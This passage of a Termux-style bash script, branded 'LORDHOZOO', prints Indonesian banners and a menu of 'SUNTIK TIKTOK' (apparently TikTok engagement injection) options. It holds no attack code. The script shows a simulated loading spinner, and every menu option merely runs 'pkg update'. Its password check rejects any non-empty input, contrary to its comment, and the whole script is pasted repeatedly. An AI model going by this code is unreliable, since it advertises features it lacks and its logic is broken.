fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    pkg update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    pkg update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    pkg update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    pkg update
fi


if [ "$updt" -eq 25 ]; then
    # Add your code here for option 25
    apt update -y
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    pkg update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    pkg update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    pkg update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    pkg update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    pkg update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    pkg update
fi



if [ "$updt" -eq 26 ]; then
    # Add your code here for option 26
    apt update -y
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    pkg update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    pkg update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    pkg update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    pkg update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    pkg update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    pkg update
fi


if [ "$updt" -eq 27 ]; then
    # Add your code here for option 27
    apt update -y 
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    pkg update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    pkg update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    pkg update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    pkg update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    pkg update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    pkg update
fi


if [ "$updt" -eq 28 ]; then
    # Add your code here for option 28
    apt update -y
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    pkg update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    pkg update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    pkg update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    pkg update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    pkg update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    pkg update
fi



if [ "$updt" -eq 29 ]; then
    # Add your code here for option 29
    apt  update -y
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
